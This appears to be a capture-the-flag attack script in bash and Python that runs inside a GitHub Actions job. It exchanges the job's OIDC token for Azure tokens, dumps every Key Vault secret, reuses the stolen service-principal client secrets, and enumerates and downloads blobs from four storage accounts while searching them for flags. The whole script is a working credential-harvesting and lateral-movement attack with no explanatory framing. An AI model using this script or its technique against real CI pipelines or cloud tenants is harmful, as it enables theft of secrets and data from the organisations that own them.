#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
KVT=oidc("https://vault.azure.net/.default"); ARM=oidc("https://management.azure.com/.default")
creds={"__oidc__":None}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass

print("### custom role 17d1049b definition")
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/"
          f"roleDefinitions/17d1049b-9a84-46fb-8f53-862d1f6d3522?api-version=2022-04-01",
          headers={"Authorization":"Bearer "+ARM})
print("  ", st, b[:400])

ACCTS=["sttblcilogsprodx3euoz","sttblbackupprodx3euoz","sttblappcfgprodx3euoz","sttblarchiveprodx3euoz"]
def sttok(c):
    if c is None: return oidc("https://storage.azure.com/.default")
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://storage.azure.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")

print("\n### blob data-plane via AAD")
for n,c in creds.items():
    t=sttok(c)
    if not t: print(f"  {n}: no storage token"); continue
    H={"Authorization":"Bearer "+t,"x-ms-version":"2021-08-06"}
    for a in ACCTS:
        st,b=http(f"https://{a}.blob.core.windows.net/?comp=list", headers=H)
        if st!=200:
            print(f"  {n:28} {a:24} list {st}"); continue
        conts=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b)]
        print(f"  {n:28} {a:24} OK containers={conts}")
        for cn in conts:
            st,b2=http(f"https://{a}.blob.core.windows.net/{cn}?restype=container&comp=list", headers=H)
            if st!=200: print(f"      {cn}: {st}"); continue
            blobs=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b2)]
            print(f"      {cn}: {blobs[:20]}")
            for bl in blobs[:30]:
                st,bb=http(f"https://{a}.blob.core.windows.net/{cn}/{urllib.parse.quote(bl)}", headers=H)
                if st==200:
                    m=FLAG.search(bb)
                    if m: print(f"        >>> FLAG in {a}/{cn}/{bl}: {m.group(1).decode()}")
PYEOF
echo "=== done ==="